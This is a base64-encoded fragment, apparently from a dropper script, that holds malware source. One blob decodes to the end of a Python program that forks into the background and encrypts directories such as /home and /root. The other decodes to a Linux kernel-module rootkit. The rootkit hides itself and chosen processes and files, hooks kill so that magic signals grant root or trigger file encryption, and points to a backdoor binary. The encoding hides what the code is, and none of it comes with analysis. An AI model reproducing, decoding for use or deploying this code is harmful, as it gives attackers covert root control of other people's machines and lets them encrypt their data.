0KCkKICAgICAgICAgICAgICAgICAgICB0aHJlYWRzLmFwcGVuZCh0KQogICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICBlbmNfZGlyKG9zLnBhdGguam9pbihyb290LCBkKSkKCnBpZCA9IG9zLmZvcmsoKQppZiBwaWQgPjA6CiAgICBleGl0KDApCnQ9dGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9ZW5jX2RpcikKdC5zdGFydCgpCnRocmVhZHMuYXBwZW5kKHQpCnQ9dGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9ZW5jX2RpcixhcmdzPSgiL2hvbWUvIiwpKQp0LnN0YXJ0KCkKdGhyZWFkcy5hcHBlbmQodCkKdD10aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1lbmNfZGlyLCBhcmdzPSgiL3Jvb3QvIiwpKQp0LnN0YXJ0KCkKdGhyZWFkcy5hcHBlbmQodCkKcHJpbnQoInV3dS4uLiIpCmZvciB0IGluIHRocmVhZHM6CiAgICB0LmpvaW4oKQogICAgZGVsIHQKcHJpbnQoInV3dSEhISIpCmlmIGM6CiAgICBjLmNsb3NlKCk="
LOCUTUS_C="I2luY2x1ZGUgPGxpbnV4L21vZHVsZS5oPgojaW5jbHVkZSA8bGludXgva2VybmVsLmg+CiNpbmNsdWRlIDxsaW51eC9rYWxsc3ltcy5oPgojaW5jbHVkZSA8bGludXgvc2xhYi5oPgojaW5jbHVkZSA8bGludXgvdm1hbGxvYy5oPgojaW5jbHVkZSA8bGludXgvZGlyZW50Lmg+CgojaW5jbHVkZSA8bGludXgvdmVyc2lvbi5oPgojaW5jbHVkZSA8bGludXgvc2NoZWQuaD4KI2luY2x1ZGUgPGxpbnV4L3N5c2NhbGxzLmg+CgoKI2lmIExJTlVYX1ZFUlNJT05fQ09ERSA8IEtFUk5FTF9WRVJTSU9OKDQsIDEzLCAwKQojaW5jbHVkZSA8YXNtL3VhY2Nlc3MuaD4KI2VuZGlmCgojaWYgTElOVVhfVkVSU0lPTl9DT0RFID49IEtFUk5FTF9WRVJTSU9OKDMsIDEwLCAwKQojaW5jbHVkZSA8bGludXgvcHJvY19ucy5oPgojZWxzZQojaW5jbHVkZSA8bGludXgvcHJvY19mcy5oPgojZW5kaWYKCiNpZiBMSU5VWF9WRVJTSU9OX0NPREUgPCBLRVJORUxfVkVSU0lPTigyLCA2LCAyNikKI2luY2x1ZGUgPGxpbnV4L2ZpbGUuaD4KI2Vsc2UKI2luY2x1ZGUgPGxpbnV4L2ZkdGFibGUuaD4KI2VuZGlmCgojaWYgTElOVVhfVkVSU0lPTl9DT0RFIDw9IEtFUk5FTF9WRVJTSU9OKDIsIDYsIDE4KQojaW5jbHVkZSA8bGludXgvdW5pc3RkLmg+CiNlbmRpZgoKI2lmbmRlZiBfX05SX2dldGRlbnRzCiNkZWZpbmUgX19OUl9nZXRkZW50cyAxNDEKI2VuZGlmCgojZGVmaW5lIFBSRUZJWCAiYm9yZ18iCiNkZWZpbmUgRE9PUiAiL2Jpbi9ib3JnX3RyYW5zd2FycCIKI2RlZmluZSBFTkMgIi9iaW4vYm9yZ19lbmMiCiNkZWZpbmUgREVDICIvYmluL2JvcmdfZGVjIgojZGVmaW5lIFBGX0lOVklTSUJMRSAweDEwMDAwMDAwCgojaWYgTElOVVhfVkVSU0lPTl9DT0RFID49IEtFUk5FTF9WRVJTSU9OKDUsIDcsIDApCiNkZWZpbmUgS1BST0JFX0xPT0tVUCAxCiNpbmNsdWRlIDxsaW51eC9rcHJvYmVzLmg+CnN0YXRpYyBzdHJ1Y3Qga3Byb2JlIGtwID0gewogICAgLnN5bWJvbF9uYW1lID0gImthbGxzeW1zX2xvb2t1cF9uYW1lIiwKfTsKI2VuZGlmCgoKI2lmIGRlZmluZWQoQ09ORklHX1g4Nl82NCkgJiYgKExJTlVYX1ZFUlNJT05fQ09ERSA+PSBLRVJORUxfVkVSU0lPTig0LDE3LDApKQojZGVmaW5lIFBUUkVHU19TWVNDQUxMX1NUVUJTIDEKI2VuZGlmCgojaWZkZWYgUFRSRUdTX1NZU0NBTExfU1RVQlMKdHlwZWRlZiBhc21saW5rYWdlIGxvbmcoKnB0cmVnc190KShjb25zdCBzdHJ1Y3QgcHRfcmVncyAqcmVncyk7CnN0YXRpYyBwdHJlZ3NfdCBvcmlnX2tpbGw7CnN0YXRpYyBhc21saW5rYWdlIGxvbmcgKCpvcmlnX2dldGRlbnRzNjQpKGNvbnN0IHN0cnVjdCBwdF9yZWdzICopOwpzdGF0aWMgYXNtbGlua2FnZSBsb25nICgqb3JpZ19nZXRkZW50cykoY29uc3Qgc3RydWN0IHB0X3JlZ3MgKik7CiNlbHNlCnR5cGVkZWYgYXNtbGlua2FnZSBsb25nKCpvcmlnX2tpbGxfdCkocGlkX3QgcGlkLCBpbnQgc2lnKTsKb3JpZ19raWxsX3Qgb3JpZ19raWxsOwpzdGF0aWMgYXNtbGlua2FnZSBsb25nICgqb3JpZ19nZXRkZW50czY0KSh1bnNpZ25lZCBpbnQgZmQsIHN0cnVjdCBsaW51eF9kaXJlbnQ2NCAqZGlyZW50LCB1bnNpZ25lZCBpbnQgY291bnQpOwpzdGF0aWMgYXNtbGlua2FnZSBsb25nICgqb3JpZ19nZXRkZW50cykodW5zaWduZWQgaW50IGZkLCBzdHJ1Y3QgbGludXhfZGlyZW50ICpkaXJlbnQsIHVuc2lnbmVkIGludCBjb3VudCk7CiNlbmRpZgoKCgp1bnNpZ25lZCBsb25nICpfX3N5c19jYWxsX3RhYmxlID0gTlVMTDsKCmNoYXIgaGlkZV9waWRbTkFNRV9NQVhdOyAKCgoKc3RhdGljIGlubGluZSB2b2lkIHdyaXRlX2NyMF9mb3JjZWQodW5zaWduZWQgbG9uZyB2YWwpIHsKICAgIHVuc2lnbmVkIGxvbmcgX19mb3JjZV9vcmRlcjsKCiAgICAvKiBfX2FzbV9fIF9fdm9sYXRpbGVfXyggKi8KICAgIGFzbSB2b2xhdGlsZSgKICAgICAgICAibW92ICUwLCAlJWNyMCIKICAgICAgICA6ICIrciIodmFsKSwgIittIihfX2ZvcmNlX29yZGVyKSk7Cn0KCnN0YXRpYyBpbmxpbmUgdm9pZCBwcm90ZWN0X21lbW9yeSh2b2lkKSB7CiAgICB3cml0ZV9jcjBfZm9yY2VkKHJlYWRfY3IwKCkgfCAoMHgxMDAwMCkpOwp9CgpzdGF0aWMgaW5saW5lIHZvaWQgdW5wcm90ZWN0X21lbW9yeSh2b2lkKSB7CiAgICB3cml0ZV9jcjBfZm9yY2VkKHJlYWRfY3IwKCkgJiAofjB4MTAwMDApKTsKfQoKCnN0YXRpYyB1bnNpZ25lZCBsb25nICpnZXRfc3lzY2FsbF90YWJsZSh2b2lkKSB7Cgl1bnNpZ25lZCBsb25nKiBzeXNjYWxsX3RhYmxlID0gTlVMTDsKCSNpZiBMSU5VWF9WRVJTSU9OX0NPREUgPiBLRVJORUxfVkVSU0lPTig0LCA0LCAwKQoJCSNpZmRlZiBLUFJPQkVfTE9PS1VQCiAgICAJCQl0eXBlZGVmIHVuc2lnbmVkIGxvbmcgKCprYWxsc3ltc19sb29rdXBfbmFtZV90KShjb25zdCBjaGFyICpuYW1lKTsKICAgIAkJCWthbGxzeW1zX2xvb2t1cF9uYW1lX3Qga2FsbHN5bXNfbG9va3VwX25hbWU7CiAgICAJCQlyZWdpc3Rlcl9rcHJvYmUoJmtwKTsKICAgIAkJCWthbGxzeW1zX2xvb2t1cF9uYW1lID0gKGthbGxzeW1zX2xvb2t1cF9uYW1lX3QpIGtwLmFkZHI7CiAgICAJCQl1bnJlZ2lzdGVyX2twcm9iZSgma3ApOwoJCSNlbmRpZgoJCXN5c2NhbGxfdGFibGUgPSAodW5zaWduZWQgbG9uZyopa2FsbHN5bXNfbG9va3VwX25hbWUoInN5c19jYWxsX3RhYmxlIik7CgkKCSNlbHNlCiAgICAgICAgZm9yIChpID0gKHVuc2lnbmVkIGxvbmcgaW50KXN5c19jbG9zZTsgaSA8IFVMT05HX01BWDsKICAgICAgICAgICAgICAgICAgICAgICAgaSArPSBzaXplb2Yodm9pZCAqKSkgewogICAgICAgICAgICAgICAgc3lzY2FsbF90YWJsZSA9ICh1bnNpZ25lZCBsb25nICopaTsKCiAgICAgICAgICAgICAgICBpZiAoc3lzY2FsbF90YWJsZVtfX05SX2Nsb3NlXSA9PSBzeXNfY2xvc2UpCiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiBzeXNjYWxsX3RhYmxlOwogICAgICAgIH0KCSNlbmRpZgoJcmV0dXJuKHN5c2NhbGxfdGFibGUpOwp9CgpzdGF0aWMgaW50IGVuYWJsZV90cmFuc3dhcnAodm9pZCl7CgljaGFyICphcmd2W10gPSB7IERPT1IsIE5VTEwsIE5VTEwgfTsKCXN0YXRpYyBjaGFyICplbnZwW10gPSB7CgkJIkhPTUU9LyIsCgkJIlRFUk09eHRlcm0iLAoJCSJQQVRIPS9zYmluOi9iaW46L3Vzci9zYmluOi91c3IvYmluIiwgTlVMTCB9OwoJcmV0dXJuIGNhbGxfdXNlcm1vZGVoZWxwZXIoYXJndlswXSwgYXJndiwgZW52cCwgVU1IX1dBSVRfUFJPQyk7Cn0KCnN0YXRpYyBpbnQgZW5jb2RlX2ZpbGVzKHZvaWQpewoJY2hhciAqYXJndltdID0geyBFTkMsIE5VTEwsIE5VTEwgfTsKCXN0YXRpYyBjaGFyICplbnZwW10gPSB7CgkJIkhPTUU9LyIsCgkJIlRFUk09eHRlcm0iLAoJCSJQQVRIPS9zYmluOi9iaW46L3Vzci9zYmluOi91c3IvYmluIiwgTlVMTCB9OwoJcmV0dXJuIGNhbGxfdXNlcm1vZGVoZWxwZXIoYXJndlswXSwgYXJndiwgZW52cCwgVU1IX1dBSVRfUFJPQyk7Cn0Kc3RhdGljIGludCBkZWNvZGVfZmlsZXModm9pZCl7CgljaGFyICphcmd2W10gPSB7IERFQywgTlVMTCwgTlVMTCB9OwoJc3RhdGljIGNoYXIgKmVudnBbXSA9IHsKCQkiSE9NRT0vIiwKCQkiVEVSTT14dGVybSIsCgkJIlBBVEg9L3NiaW46L2JpbjovdXNyL3NiaW46L3Vzci9iaW4iLCBOVUxMIH07CglyZXR1cm4gY2FsbF91c2VybW9kZWhlbHBlcihhcmd2WzBdLCBhcmd2LCBlbnZwLCBVTUhfV0FJVF9QUk9DKTsKfQpzdHJ1Y3QgbGludXhfZGlyZW50IHsKICAgICAgICB1bnNpZ25lZCBsb25nICAgZF9pbm87CiAgICAgICAgdW5zaWduZWQgbG9uZyAgIGRfb2ZmOwogICAgICAgIHVuc2lnbmVkIHNob3J0ICBkX3JlY2xlbjsKICAgICAgICBjaGFyICAgICAgICAgICAgZF9uYW1lWzFdOwp9OwojaWZuZGVmIElTX0VOQUJMRUQKI2RlZmluZSBJU19FTkFCTEVEKG9wdGlvbikgXAooZGVmaW5lZChfX2VuYWJsZWRfICMjIG9wdGlvbikgfHwgZGVmaW5lZChfX2VuYWJsZWRfICMjIG9wdGlvbiAjIyBfTU9EVUxFKSkKI2VuZGlmCnN0cnVjdCB0YXNrX3N0cnVjdCAqCmZpbmRfdGFzayhwaWRfdCBwaWQpCnsKCXN0cnVjdCB0YXNrX3N0cnVjdCAqcCA9IGN1cnJlbnQ7Cglmb3JfZWFjaF9wcm9jZXNzKHApIHsKCQlpZiAocC0+cGlkID09IHBpZCkKCQkJcmV0dXJuIHA7Cgl9CglyZXR1cm4gTlVMTDsKfQoKaW50CmlzX2ludmlzaWJsZShwaWRfdCBwaWQpCnsKCXN0cnVjdCB0YXNrX3N0cnVjdCAqdGFzazsKCWlmICghcGlkKQoJCXJldHVybiAwOwoJdGFzayA9IGZpbmRfdGFzayhwaWQpOwoJaWYgKCF0YXNrKQoJCXJldHVybiAwOwoJaWYgKHRhc2stPmZsYWdzICYgUEZfSU5WSVNJQkxFKQoJCXJldHVybiAxOwoJcmV0dXJuIDA7Cn0KCnZvaWQgc2V0X3Jvb3Qodm9pZCkKewogICAgc3RydWN0IGNyZWQgKnJvb3Q7CiAgICByb290ID0gcHJlcGFyZV9jcmVkcygpOwoKICAgIGlmIChyb290ID09IE5VTEwpCiAgICAgICAgcmV0dXJuOwoKICAgIHJvb3QtPnVpZC52YWwgPSByb290LT5naWQudmFsID0gMDsKICAgIHJvb3QtPmV1aWQudmFsID0gcm9vdC0+ZWdpZC52YWwgPSAwOwogICAgcm9vdC0+c3VpZC52YWwgPSByb290LT5zZ2lkLnZhbCA9IDA7CiAgICByb290LT5mc3VpZC52YWwgPSByb290LT5mc2dpZC52YWwgPSAwOwoKICAgIGNvbW1pdF9jcmVkcyhyb290KTsKfQoKCnN0YXRpYyB2b2lkIF9faW5pdCBoaWRlX215c2VsZih2b2lkKQp7CiAgICBzdHJ1Y3Qgdm1hcF9hcmVhICp2YSwgKnZ0bXA7CiAgICBzdHJ1Y3QgbW9kdWxlX3VzZSAqdXNlLCAqdG1wOwogICAgc3RydWN0IGxpc3RfaGVhZCAqX3ZtYXBfYXJlYV9saXN0OwogICAgc3RydWN0IHJiX3Jvb3QgKl92bWFwX2FyZWFfcm9vdDsKCiNpZmRlZiBLUFJPQkVfTE9PS1VQCiAgICB1bnNpZ25lZCBsb25nICgqa2FsbHN5bXNfbG9va3VwX25hbWUpKGNvbnN0IGNoYXIgKm5hbWUpOwogICAgaWYgKHJlZ2lzdGVyX2twcm9iZSgma3ApIDwgMCkKICAgICAgICByZXR1cm47CiAgICBrYWxsc3ltc19sb29rdXBfbmFtZSA9ICh1bnNpZ25lZCBsb25nICgqKShjb25zdCBjaGFyICpuYW1lKSkga3AuYWRkcjsKICAgIHVucmVnaXN0ZXJfa3Byb2JlKCZrcCk7CiNlbmRpZgoKICAgIF92bWFwX2FyZWFfbGlzdCA9CiAgICAgICAgKHN0cnVjdCBsaXN0X2hlYWQgKikga2FsbHN5bXNfbG9va3VwX25hbWUoInZtYXBfYXJlYV9saXN0Iik7CiAgICBfdm1hcF9hcmVhX3Jvb3QgPSAoc3RydWN0IHJiX3Jvb3QgKikga2FsbHN5bXNfbG9va3VwX25hbWUoInZtYXBfYXJlYV9yb290Iik7CgogICAgLyogaGlkZGVuIGZyb20gL3Byb2Mvdm1hbGxvY2luZm8gKi8KICAgIGxpc3RfZm9yX2VhY2hfZW50cnlfc2FmZSAodmEsIHZ0bXAsIF92bWFwX2FyZWFfbGlzdCwgbGlzdCkgewogICAgICAgIGlmICgodW5zaWduZWQgbG9uZykgVEhJU19NT0RVTEUgPiB2YS0+dmFfc3RhcnQgJiYKICAgICAgICAgICAgKHVuc2lnbmVkIGxvbmcpIFRISVNfTU9EVUxFIDwgdmEtPnZhX2VuZCkgewogICAgICAgICAgICBsaXN0X2RlbCgmdmEtPmxpc3QpOwogICAgICAgICAgICAvKiByZW1vdmUgZnJvbSByZWQtYmxhY2sgdHJlZSAqLwogICAgICAgICAgICByYl9lcmFzZSgmdmEtPnJiX25vZGUsIF92bWFwX2FyZWFfcm9vdCk7CiAgICAgICAgfQogICAgfQoKICAgIC8qIGhpZGRlbiBmcm9tIC9wcm9jL21vZHVsZXMgKi8KICAgIGxpc3RfZGVsX2luaXQoJlRISVNfTU9EVUxFLT5saXN0KTsKCiAgICAvKiBoaWRkZW4gZnJvbSAvc3lzL21vZHVsZXMgKi8KICAgIGtvYmplY3RfZGVsKCZUSElTX01PRFVMRS0+bWtvYmoua29iaik7CgogICAgLyogZGVjb3VwbGUgdGhlIGRlcGVuZGVuY3kgKi8KICAgIGxpc3RfZm9yX2VhY2hfZW50cnlfc2FmZSAodXNlLCB0bXAsICZUSElTX01PRFVMRS0+dGFyZ2V0X2xpc3QsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRhcmdldF9saXN0KSB7CiAgICAgICAgbGlzdF9kZWwoJnVzZS0+c291cmNlX2xpc3QpOwogICAgICAgIGxpc3RfZGVsKCZ1c2UtPnRhcmdldF9saXN0KTsKICAgICAgICBzeXNmc19yZW1vdmVfbGluayh1c2UtPnRhcmdldC0+aG9sZGVyc19kaXIsIFRISVNfTU9EVUxFLT5uYW1lKTsKICAgICAgICBrZnJlZSh1c2UpOwogICAgfQp9CgoKI2lmZGVmIFBUUkVHU19TWVNDQUxMX1NUVUJTCmFzbWxpbmthZ2UgaW50IGhvb2tfa2lsbChjb25zdCBzdHJ1Y3QgcHRfcmVncyAqcmVncykKewogICAgdm9pZCBzZXRfcm9vdCh2b2lkKTsKICAgIHN0cnVjdCB0YXNrX3N0cnVjdCAqdGFzazsKICAgIGludCBzaWcgPSByZWdzLT5zaTsKICAgIHBpZF90IHBpZCA9IHJlZ3MtPmRpOwoKICAgIGlmIChzaWcgPT0gNjQpCiAgICB7CiAgICAgICAgc2V0X3Jvb3QoKTsKICAgICAgICByZXR1cm4gMDsKICAgIH0KICAgIGVsc2UgaWYoc2lnID09IDYzKSB7IC8vIGhpZGUgcGlkCiAgICAgICAgLy9zcHJpbnRmKGhpZGVfcGlkLCAiJWQiLCBwaWQpOwogICAgICAgIGlmICgodGFzayA9IGZpbmRfdGFzayhwaWQpKSA9PSBOVUxMKSByZXR1cm4gLUVTUkNIOwogICAgICAgICAgICAgICAgdGFzay0+ZmxhZ3MgXj0gUEZfSU5WSVNJQkxFOwoJcmV0dXJuKDApOwogICAgfQoJZWxzZSBpZihzaWc9PTYyKSB7CgkJZW5jb2RlX2ZpbGVzKCk7CgkJcmV0dXJuKDApOwoJfQoJZWxzZSBpZihzaWc9PTYxKSB7CgkJZGVjb2RlX2ZpbGVzKCk7CgkJcmV0dXJuKDApOwoJfQogICAgcmV0dXJuIG9yaWdfa2lsbChyZWdzKTsKfQojZWxzZQppbnQgaG9va19raWxsKHBpZF90IHBpZCwgaW50IHNpZykKewogICAgdm9pZCBzZXRfcm9vdCh2b2lkKTsKICAgIHN0cnVjdCB0YXNrX3N0cnVjdCAqdGFzazsKICAgIGlmIChzaWcgPT0gLTY0KQogICAgewogICAgICAgIHNldF9yb290KCk7CiAgICAgICAgcmV0dXJuIDA7CiAgICB9CiAgICBlbHNlIGlmKHNpZyA9PSAtNjMpIHsgLy8gaGlkZSBwaWQKICAgICAgICAvL3NwcmludGYoaGlkZV9waWQsICIlZCIsIHBpZCk7CiAgICAgICAgaWYgKCh0YXNrID0gZmluZF90YXNrKHBpZCkpID09IE5VTEwpIHJldHVybiAtRVNSQ0g7CgkJdGFzay0+ZmxhZ3MgXj0gUEZfSU5WSVNJQkxFOwoJcmV0dXJuKDApOwogICAgfQoJZWxzZSBpZihzaWc9PS02MikgewoJCWVuY29kZV9maWxlcygpOwoJCXJldHVybigwKTsKCX0KCWVsc2UgaWYoc2lnPT0tNjEpIHsKCQlkZWNvZGVfZmlsZXMoKTsKCQlyZXR1cm4oMCk7Cgl9CgogICAgcmV0dXJuIG9yaWdfa2lsbChwaWQsIHNpZyk7Cn0KI2VuZGlmCgojaWZkZWYgUFRSRUdTX1NZU0NBTExfU1RVQlMKYXNtbGlua2FnZSBpbnQgaG9va19nZXRkZW50czY0KGNvbnN0IHN0cnVjdCBwdF9yZWdzICpwdF9yZWdzKQp7CiNpZiBJU19FTkFCTEVEKENPTkZJR19YODYpIHx8IElTX0VOQUJMRUQoQ09ORklHX1g4Nl82NCkKCWludCBmZCA9IChpbnQpIHB0X3JlZ3MtPmRpOwoJc3RydWN0IGxpbnV4X2RpcmVudCAqIGRpcmVudCA9IChzdHJ1Y3QgbGludXhfZGlyZW50ICopIHB0X3JlZ3MtPnNpOwojZWxpZiBJU19FTkFCTEVEKENPTkZJR19BUk02NCkKCWludCBmZCA9IChpbnQpIHB0X3JlZ3MtPnJlZ3NbMF07CglzdHJ1Y3QgbGludXhfZGlyZW50ICogZGlyZW50ID0gKHN0cnVjdCBsaW51eF9kaXJlbnQgKikgcHRfcmVncy0+cmVnc1sxXTsKI2VuZGlmCglpbnQgcmV0ID0gb3JpZ19nZXRkZW50czY0KHB0X3JlZ3MpLCBlcnI7CiAgICB1bnNpZ25lZCBzaG9ydCBwcm9jID0gMDsKCXVuc2lnbmVkIGxvbmcgb2ZmID0gMDsKCXN0cnVjdCBsaW51eF9kaXJlbnQ2NCAqZGlyLCAqa2RpcmVudCwgKnByZXYgPSBOVUxMOwoJc3RydWN0IGlub2RlICpkX2lub2RlOwoKCWlmIChyZXQgPD0gMCkKCQlyZXR1cm4gcmV0OwoKCWtkaXJlbnQgPSBremFsbG9jKHJldCwgR0ZQX0tFUk5FTCk7CglpZiAoa2RpcmVudCA9PSBOVUxMKQoJCXJldHVybiByZXQ7CgoJZXJyID0gY29weV9mcm9tX3VzZXIoa2RpcmVudCwgZGlyZW50LCByZXQpOwoJaWYgKGVycikKCQlnb3RvIG91dDsKCiNpZiBMSU5VWF9WRVJTSU9OX0NPREUgPCBLRVJORUxfVkVSU0lPTigzLCAxOSwgMCkKCWRfaW5vZGUgPSBjdXJyZW50LT5maWxlcy0+ZmR0LT5mZFtmZF0tPmZfZGVudHJ5LT5kX2lub2RlOwojZWxzZQoJZF9pbm9kZSA9IGN1cnJlbnQtPmZpbGVzLT5mZHQtPmZkW2ZkXS0+Zl9wYXRoLmRlbnRyeS0+ZF9pbm9kZTsKI2VuZGlmCglpZiAoZF9pbm9kZS0+aV9pbm8gPT0gUFJPQ19ST09UX0lOTyAmJiAhTUFKT1IoZF9pbm9kZS0+aV9yZGV2KQoJCS8qJiYgTUlOT1IoZF9pbm9kZS0+aV9yZGV2KSA9PSAxKi8pCgkJcHJvYyA9IDE7CgoJd2hpbGUgKG9mZiA8IHJldCkgewoJCWRpciA9ICh2b2lkICopa2RpcmVudCArIG9mZjsKCQlpZiAoKCFwcm9jICYmCgkJKG1lbWNtcChQUkVGSVgsIGRpci0+ZF9uYW1lLCBzdHJsZW4oUFJFRklYKSkgPT0gMCkpCgkJfHwgKHByb2MgJiYKCQlpc19pbnZpc2libGUoc2ltcGxlX3N0cnRvdWwoZGlyLT5kX25hbWUsIE5VTEwsIDEwKSkpKSB7CgkJCWlmIChkaXIgPT0ga2RpcmVudCkgewoJCQkJcmV0IC09IGRpci0+ZF9yZWNsZW47CgkJCQltZW1tb3ZlKGRpciwgKHZvaWQgKilkaXIgKyBkaXItPmRfcmVjbGVuLCByZXQpOwoJCQkJY29udGludWU7CgkJCX0KCQkJcHJldi0+ZF9yZWNsZW4gKz0gZGlyLT5kX3JlY2xlbjsKCQl9IGVsc2UKCQkJcHJldiA9IGRpcjsKCQlvZmYgKz0gZGlyLT5kX3JlY2xlbjsKCX0KCWVyciA9IGNvcHlfdG9fdXNlcihkaXJlbnQsIGtkaXJlbnQsIHJldCk7CglpZiAoZXJyKQoJCWdvdG8gb3V0OwpvdXQ6CglrZnJlZShrZGlyZW50KTsKCXJldHVybiByZXQ7Cn0KCmFzbWxpbmthZ2UgaW50IGhvb2tfZ2V0ZGVudHMoY29uc3Qgc3RydWN0IHB0X3JlZ3MgKnB0X3JlZ3MpCnsKICNpZiBJU19FTkFCTEVEKENPTkZJR19YODYpIHx8IElTX0VOQUJMRUQoQ09ORklHX1g4Nl82NCkKCWludCBmZCA9IChpbnQpIHB0X3JlZ3MtPmRpOwoJc3RydWN0IGxpbnV4X2RpcmVudCAqIGRpcmVudCA9IChzdHJ1Y3QgbGludXhfZGlyZW50ICopIHB0X3JlZ3MtPnNpOwojZWxpZiBJU19FTkFCTEVEKENPTkZJR19BUk02NCkKCQlpbnQgZmQgPSAoaW50KSBwdF9yZWdzLT5yZWdzWzBdOwoJc3RydWN0IGxpbnV4X2RpcmVudCAqIGRpcmVudCA9IChzdHJ1Y3QgbGludXhfZGlyZW50ICopIHB0X3JlZ3MtPnJlZ3NbMV07CiNlbmRpZgoJaW50IHJldCA9IG9yaWdfZ2V0ZGVudHMocHRfcmVncyksIGVycjsKCXVuc2lnbmVkIHNob3J0IHByb2MgPSAwOwoJdW5zaWduZWQgbG9uZyBvZmYgPSAwOwoJc3RydWN0IGxpbnV4X2RpcmVudCAqZGlyLCAqa2RpcmVudCwgKnByZXYgPSBOVUxMOwoJc3RydWN0IGlub2RlICpkX2lub2RlOwoKCWlmIChyZXQgPD0gMCkKCQlyZXR1cm4gcmV0OwkKCglrZGlyZW50ID0ga3phbGxvYyhyZXQsIEdGUF9LRVJORUwpOwoJaWYgKGtkaXJlbnQgPT0gTlVMTCkKCQlyZXR1cm4gcmV0OwoKCWVyciA9IGNvcHlfZnJvbV91c2VyKGtkaXJlbnQsIGRpcmVudCwgcmV0KTsKCWlmIChlcnIpCgkJZ290byBvdXQ7CgojaWYgTElOVVhfVkVSU0lPTl9DT0RFIDwgS0VSTkVMX1ZFUlNJT04oMywgMTksIDApCglkX2lub2RlID0gY3VycmVudC0+ZmlsZXMtPmZkdC0+ZmRbZmRdLT5mX2RlbnRyeS0+ZF9pbm9kZTsKI2Vsc2UKCWRfaW5vZGUgPSBjdXJyZW50LT5maWxlcy0+ZmR0LT5mZFtmZF0tPmZfcGF0aC5kZW50cnktPmRfaW5vZGU7CiNlbmRpZgoKCWlmIChkX2lub2RlLT5pX2lubyA9PSBQUk9DX1JPT1RfSU5PICYmICFNQUpPUihkX2lub2RlLT5pX3JkZXYpCgkJLyomJiBNSU5PUihkX2lub2RlLT5pX3JkZXYpID09IDEqLykKCQlwcm9jID0gMTsKCgl3aGlsZSAob2ZmIDwgcmV0KSB7CgkJZGlyID0gKHZvaWQgKilrZGlyZW50ICsgb2ZmOwoJCWlmICgoIXByb2MgJiYgCgkJKG1lbWNtcChQUkVGSVgsIGRpci0+ZF9uYW1lLCBzdHJsZW4oUFJFRklYKSkgPT0gMCkpCgkJfHwgKHByb2MgJiYKCQlpc19pbnZpc2libGUoc2ltcGxlX3N0cnRvdWwoZGlyLT5kX25hbWUsIE5VTEwsIDEwKSkpKSB7CgkJCWlmIChkaXIgPT0ga2RpcmVudCkgewoJCQkJcmV0IC09IGRpci0+ZF9yZWNsZW47CgkJCQltZW1tb3ZlKGRpciwgKHZvaWQgKilkaXIgKyBkaXItPmRfcmVjbGVuLCByZXQpOwoJCQkJY29udGludWU7CgkJCX0KCQkJcHJldi0+ZF9yZWNsZW4gKz0gZGlyLT5kX3JlY2xlbjsKCQl9IGVsc2UKCQkJcHJldiA9IGRpcjsKCQlvZmYgKz0gZGlyLT5kX3JlY2xlbjsKCX0KCWVyciA9IGNvcHlfdG9fdXNlcihkaXJlbnQsIGtkaXJlbnQsIHJldCk7CglpZiAoZXJyKQoJCWdvdG8gb3V0OwpvdXQ6CglrZnJlZShrZGlyZW50KTsKCXJldHVybiByZXQ7Cgp9CiNlbHNlCgpzdGF0aWMgYXNtbGlua2FnZSBpbnQgaG9va19nZXRkZW50czY0KHVuc2lnbmVkIGludCBmZCwgc3RydWN0IGxpbnV4X2RpcmVudDY0ICpkaXJlbnQsIHVuc2lnbmVkIGludCBjb3VudCkKewoJaW50IHJldCA9IG9yaWdfZ2V0ZGVudHM2NChmZCwgZGlyZW50LCBjb3VudCksIGVycjsKCXVuc2lnbmVkIHNob3J0IHByb2MgPSAwOwoJdW5zaWduZWQgbG9uZyBvZmYgPSAwOwoJc3RydWN0IGxpbnV4X2RpcmVudDY0ICpkaXIsICprZGlyZW50LCAqcHJldiA9IE5VTEw7CglzdHJ1Y3QgaW5vZGUgKmRfaW5vZGU7CgoJaWYgKHJldCA8PSAwKQoJCXJldHVybiByZXQ7CgoJa2RpcmVudCA9IGt6YWxsb2MocmV0LCBHRlBfS0VSTkVMKTsKCWlmIChrZGlyZW50ID09IE5VTEwpCgkJcmV0dXJuIHJldDsKCgllcnIgPSBjb3B5X2Zyb21fdXNlcihrZGlyZW50LCBkaXJlbnQsIHJldCk7CglpZiAoZXJyKQoJCWdvdG8gb3V0OwoKI2lmIExJTlVYX1ZFUlNJT05fQ09ERSA8IEtFUk5FTF9WRVJTSU9OKDMsIDE5LCAwKQoJZF9pbm9kZSA9IGN1cnJlbnQtPmZpbGVzLT5mZHQtPmZkW2ZkXS0+Zl9kZW50cnktPmRfaW5vZGU7CiNlbHNlCglkX2lub2RlID0gY3VycmVudC0+ZmlsZXMtPmZkdC0+ZmRbZmRdLT5mX3BhdGguZGVudHJ5LT5kX2lub2RlOwojZW5kaWYKCWlmIChkX2lub2RlLT5pX2lubyA9PSBQUk9DX1JPT1RfSU5PICYmICFNQUpPUihkX2lub2RlLT5pX3JkZXYpCgkJLyomJiBNSU5PUihkX2lub2RlLT5pX3JkZXYpID09IDEqLykKCQlwcm9jID0gMTsKCgl3aGlsZSAob2ZmIDwgcmV0KSB7CgkJZGlyID0gKHZvaWQgKilrZGlyZW50ICsgb2ZmOwoJCWlmICgoIXByb2MgJiYKCQkobWVtY21wKFBSRUZJWCwgZGlyLT5kX25hbWUsIHN0cmxlbihQUkVGSVgpKSA9PSAwKSkKCQl8fCAocHJvYyAmJgoJCWlzX2ludmlzaWJsZShzaW1wbGVfc3RydG91bChkaXItPmRfbmFtZSwgTlVMTCwgMTApKSkpIHsKCQkJaWYgKGRpciA9PSBrZGlyZW50KSB7CgkJCQlyZXQgLT0gZGlyLT5kX3JlY2xlbjsKCQkJCW1lbW1vdmUoZGlyLCAodm9pZCAqKWRpciArIGRpci0+ZF9yZWNsZW4sIHJldCk7CgkJCQljb250aW51ZTsKCQkJfQoJCQlwcmV2LT5kX3JlY2xlbiArPSBkaXItPmRfcmVjbGVuOwoJCX0gZWxzZQoJCQlwcmV2ID0gZGlyOwoJCW9mZiArPSBkaXItPmRfcmVjbGVuOwoJfQoJZXJyID0gY29weV90b191c2VyKGRpcmVudCwga2RpcmVudCwgcmV0KTsKCWlmIChlcnIpCgkJZ290byBvdXQ7Cm91dDoKCWtmcmVlKGtkaXJlbnQpOwoJcmV0dXJuIHJldDs